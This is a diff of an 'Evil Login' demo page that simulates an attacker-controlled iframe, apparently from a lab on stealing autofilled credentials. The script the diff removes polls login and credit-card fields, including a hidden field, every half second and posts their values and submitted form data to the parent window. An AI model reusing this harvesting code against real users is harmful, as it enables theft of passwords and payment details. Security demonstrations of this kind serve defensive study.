@@ -1,153 +1,51 @@
-<!doctype html>
+﻿<!doctype html>
 <html lang="en">
-
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Evil Login</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link rel="stylesheet" href="assets/css/styles.css">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Evil Login</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="assets/css/styles.css">
 </head>
-
 <body>
-    <main class="container py-4">
-        <div class="row justify-content-center">
-            <div class="col-md-8">
-                <div class="card">
-                    <div class="card-body">
-                        <h5 class="card-title">Evil page form</h5>
-                        <form id="evilForm">
-                            <div class="mb-3">
-                                <label class="form-label">Email</label>
-                                <input autocomplete="username" name="email" type="email" class="form-control"
-                                    placeholder="evil_user@example.com">
-                            </div>
-                            <div class="mb-3">
-                                <label class="form-label">Password</label>
-                                <input autocomplete="current-password" name="password" type="password"
-                                    class="form-control" placeholder="Evil_Password">
-                            </div>
-                            <div>
-                              <button type="submit" class="btn" style="background-color: #078b33;color:#dfe7e2">Sign In</button>
-                            </div>
-                            <div class="mb-3">
-                                <label class="form-label">Hidden field (prefill target)</label>
-                                <input type="text" name="secret" class="form-control" style="display:none;" />
-                            </div>
-
-                            
-                        </form>
-                        <div class="mt-3 small text-muted">This page simulates the attacker-controlled iframe.</div>
-                    </div>
-                </div>
-            </div>
+  <main class="container py-4">
+    <div class="row justify-content-center">
+      <div class="col-md-8">
+        <div class="card">
+          <div class="card-body">
+            <h5 class="card-title">Evil page form</h5>
+            <form id="evilForm" autocomplete="on">
+              <div class="mb-3">
+                <label for="evil-email" class="form-label">Email</label>
+                <input id="evil-email" autocomplete="username" name="email" type="email" class="form-control" placeholder="evil_user@example.com">
+              </div>
+              <div class="mb-3">
+                <label for="evil-password" class="form-label">Password</label>
+                <input id="evil-password" autocomplete="current-password" name="password" type="password" class="form-control" placeholder="Evil_Password">
+              </div>
+              <div class="mb-3">
+                <label class="form-label">Hidden field (prefill target)</label>
+                <input id="evil-secret" type="text" name="secret" autocomplete="username" class="form-control" style="display:none;" />
+              </div>
+              <button type="submit" class="btn btn-evil">Sign In</button>
+            </form>
+            <div class="mt-3 small text-muted">This page simulates the attacker-controlled iframe.</div>
+          </div>
         </div>
-    </main>
 
+        <div class="card mt-3">
+          <div class="card-body">
+            <h6 class="card-title">Local instrumentation log</h6>
+            <div id="localLog" class="local-log"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
 
-    <script>
-(function() {
-  // Determin parent origin from referrer 
-  let parentOrigin = '*';
-  try {
-    if (document.referrer) parentOrigin = new URL(document.referrer).origin || '*';
-  } catch(e) {}
-
-  function post(event, payload) {
-    window.parent.postMessage({
-      source: 'EvilSite',
-      event,
-      payload,
-      path: location.pathname,
-      ts: Date.now()
-    }, parentOrigin);
-  }
-
-  // Handshake when iframe is ready
-  function ready() { post('EVIL_READY', { title: document.title }); }
-  if (document.readyState === 'complete' || document.readyState === 'interactive') {
-    setTimeout(ready, 0);
-  } else {
-    window.addEventListener('DOMContentLoaded', ready);
-  }
-
-  // Response to parent ping 
-  window.addEventListener('message', (ev) => {
-    if (!ev || !ev.data) return;
-    if (ev.data.type === 'PING_PARENT') {
-      post('PONG_IFRAME', { receivedTs: Date.now() });
-    }
-  });
-
-  // Helper: find potential fields
-  function findFields() {
-    // Generaln set
-    const selectors = [
-      'input[type="text"]',
-      'input[type="email"]',
-      'input[type="password"]',
-      'input[autocomplete="username"]',
-      'input[autocomplete="current-password"]',
-      'input[autocomplete="cc-name"]',
-      'input[autocomplete="cc-number"]',
-      'input[autocomplete="cc-exp"], input[autocomplete="cc-exp-month"], input[autocomplete="cc-exp-year"]',
-      'input[autocomplete="cc-csc"], input[autocomplete="cc-cvc"], input[autocomplete="cc-cvv"]'
-    ].join(',');
-
-    const all = Array.from(document.querySelectorAll(selectors));
-    // Standard names of fields
-    const byName = ['username','email','login','password','cc-name','ccnumber','cc-number','cardnumber','cvc','cvv','exp','expiry','cc-exp']
-      .flatMap(n => Array.from(document.getElementsByName(n)));
-    const set = new Set([...all, ...byName]);
-    return Array.from(set);
-  }
-
-  // Event listeners 
-  function wireEvents(el) {
-    ['input','change'].forEach(ev =>
-      el.addEventListener(ev, () => {
-        post('FIELD_CHANGED', { name: el.name || el.id || null, value: el.value || '' });
-      })
-    );
-  }
-
-  // Polling – to catch autofill 
-  const lastValues = new WeakMap();
-  function snapshotAndReport() {
-    const fields = findFields();
-    const data = {};
-    let anyChange = false;
-    fields.forEach(el => {
-      const key = el.name || el.id || el.getAttribute('autocomplete') || el.type || 'field';
-      const val = el.value || '';
-      const prev = lastValues.get(el);
-      if (prev !== val) {
-        lastValues.set(el, val);
-        anyChange = true;
-      }
-      data[key] = val;
-    });
-    if (anyChange) {
-      post('FORM_SNAPSHOT', { data });
-    }
-  }
-
-  // Start polling: 500ms
-  const pollId = setInterval(snapshotAndReport, 500);
-
-  // Log submit
-  Array.from(document.forms).forEach(f => {
-    f.addEventListener('submit', () => {
-      const payload = {};
-      Array.from(new FormData(f).entries()).forEach(([k, v]) => payload[k] = v);
-      post('FORM_SUBMIT', { payload });
-    }, { capture: true });
-  });
-
-  // First snipet after load
-  setTimeout(snapshotAndReport, 200);
-})();
-</script>
+  <script src="assets/js/evil.js"></script>
+  <script>
+    EvilSite.init();
+  </script>
 </body>
-
 </html>
